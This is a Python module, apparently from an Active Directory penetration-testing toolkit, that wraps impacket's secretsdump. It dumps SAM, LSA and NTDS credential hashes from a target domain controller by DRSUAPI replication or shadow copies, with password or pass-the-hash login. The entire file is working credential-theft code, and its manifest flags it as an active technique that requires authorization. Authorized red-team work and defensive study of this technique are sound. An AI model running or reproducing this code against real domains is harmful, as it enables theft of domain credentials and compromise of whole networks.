"""secretsdump — SAM/LSA/NTDS extraction via impacket."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.secretsdump.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["registry_read", "drsuapi_replication", "vss_shadow"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.002", "T1003.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    method = getattr(args, "sd_method", "drsuapi")
    just_dc = getattr(args, "just_dc", False)
    just_dc_user = getattr(args, "just_dc_user", None)

    print("[*] secretsdump → {} (method: {})".format(target, method))

    try:
        from impacket.examples.secretsdump import DumpSecrets
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    options = type("Opts", (), {
        "target_ip": target, "use_vss": method == "vss",
        "just_dc": just_dc, "just_dc_user": just_dc_user or "",
        "exec_method": "smbexec", "outputfile": "",
        "hashes": "{}:{}".format(cred.lm_hash, cred.nt_hash) if cred.has_hash else None,
        "no_pass": False, "k": False, "aesKey": None,
        "dc_ip": target, "system": "", "ntds": "", "sam": "",
        "security": "", "bootkey": "", "history": False,
        "resumefile": None, "rodcNo": None, "rodcKey": None,
    })()

    try:
        target_str = "{}/{}:{}@{}".format(
            args.domain, cred.username, cred.password or "", target)
        dumper = DumpSecrets(target_str, options)
        dumper.dump()
        print("[+] Secrets dump complete")
        return 0
    except Exception as exc:
        print("[-] secretsdump error: {}".format(exc), file=sys.stderr)
        return 1
